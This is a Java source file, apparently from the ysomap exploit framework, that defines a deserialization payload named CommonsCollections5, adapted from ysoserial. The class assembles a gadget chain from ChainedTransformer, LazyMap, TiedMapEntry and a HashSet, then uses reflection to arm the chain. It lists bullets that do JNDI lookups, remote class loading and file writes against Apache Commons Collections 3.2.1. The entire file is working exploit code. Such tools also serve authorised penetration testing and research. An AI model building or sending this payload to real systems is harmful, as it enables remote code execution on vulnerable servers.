package ysomap.payloads.java.commons.collection_v3;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysomap.bullets.Bullet;
import ysomap.bullets.collections.TransformerBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;
import ysomap.payloads.AbstractPayload;

import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/**
 * from ysoserial CommonsCollections6
 * @author wh1t3P1g
 * @since 2020/2/18
 */
@SuppressWarnings({"rawtypes","unchecked"})
@Payloads
@Targets({Targets.JDK})
@Authors({ Authors.MATTHIASKAISER })
@Require(bullets = {"TransformerBullet",
        "TransformerWithJNDIBullet",
        "TransformerWithSleepBullet",
        "TransformerWithURLClassLoaderBullet",
        "TransformerWithFileWriteBullet"}, param = false)
@Dependencies({"commons-collections:commons-collections:3.2.1"})
public class CommonsCollections5 extends AbstractPayload<HashSet> {

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof Transformer[];
    }

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return TransformerBullet.newInstance(args);
    }

    @Override
    public HashSet pack(Object obj) throws Exception {
        Transformer transformerChain = new ChainedTransformer(new Transformer[]{});

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        HashSet set = PayloadHelper.makeHashSetWithEntry(entry);

        ReflectionHelper.setFieldValue(transformerChain, "iTransformers", obj); // arm with actual transformer chain
        return set;
    }
}
